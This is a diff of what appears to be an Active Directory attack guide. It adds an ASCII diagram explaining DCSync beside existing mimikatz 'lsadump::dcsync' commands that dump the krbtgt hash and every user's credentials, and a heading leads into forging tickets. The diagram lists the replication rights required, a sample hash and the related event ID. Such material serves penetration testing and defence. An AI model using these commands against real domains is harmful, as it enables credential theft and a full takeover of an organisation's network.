@@ -80,11 +80,18 @@ lsadump::dcsync /domain:corp.local /user:krbtgt
 lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">secretsdump DRSUAPI output with the krbtgt hash + aes256 key highlighted</span>
-</div>
+How DCSync works (no DC login — just replication rights):
+
+```terminal
+ [ attacker : holds DS-Replication-Get-Changes(-All) ]
+        |  IDL_DRSGetNCChanges   (MS-DRSR replication call)
+        v
+ [ Domain Controller ] --- "here are the directory secrets" --->
+        krbtgt : ...:d7e2b80507ea3b0b1b2f9c0e4a1a9f31
+        administrator, all user NT hashes + Kerberos AES keys
+        ^
+        +-- to the DC this looks like normal DC-to-DC replication  (Event ID 4662)
+```
 
 ### Get the domain SID (needed to forge tickets)
 
